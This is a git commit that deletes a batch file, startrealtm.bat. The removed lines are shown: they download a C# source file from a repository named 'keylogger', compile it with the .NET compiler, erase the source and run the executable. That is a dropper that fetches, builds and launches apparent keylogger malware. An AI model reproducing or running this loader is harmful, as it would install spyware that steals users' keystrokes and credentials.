3c873d4cce9d6615b37993dc8005f29a46632f73
AnonUser <127699732+w3irdguy@users.noreply.github.com>
2024-09-07 15:27:43 -0300

    Delete startrealtm.bat

--- startrealtm.bat
+++
@@ -1,4 +0,0 @@
-@echo off
-curl -O https://raw.githubusercontent.com/w3irdguy/keylogger/main/exploitreal.cs
-C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe exploitreal.cs
-erase exploitreal.cs & exploitreal.exe
